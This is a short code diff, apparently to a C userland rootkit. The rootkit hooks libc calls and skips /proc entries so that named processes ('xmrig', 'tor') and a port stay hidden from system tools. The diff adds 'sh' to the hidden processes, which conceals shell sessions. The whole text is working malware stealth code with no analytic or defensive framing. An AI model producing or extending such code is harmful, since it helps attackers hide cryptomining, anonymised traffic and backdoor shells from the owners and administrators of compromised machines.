@@ -29,6 +29,7 @@
  */
 static const char *process_to_filter_1 = "xmrig";
 static const char *process_to_filter_2 = "tor";
+static const char *process_to_filter_3 = "sh";
 
 /**
  * Port to hide
@@ -498,7 +499,8 @@ char *fgets(char *s, int size, FILE *stream)
                     strcmp(dir_name, "/proc") == 0 &&                  \
                     get_process_name(dir->d_name, process_name) &&     \
                     (strcmp(process_name, process_to_filter_1) == 0 || \
-                     strcmp(process_name, process_to_filter_2) == 0))  \
+                     strcmp(process_name, process_to_filter_2) == 0 || \
+                     strcmp(process_name, process_to_filter_3) == 0))  \
                 {                                                      \
                     continue;                                          \
                 }                                                      \
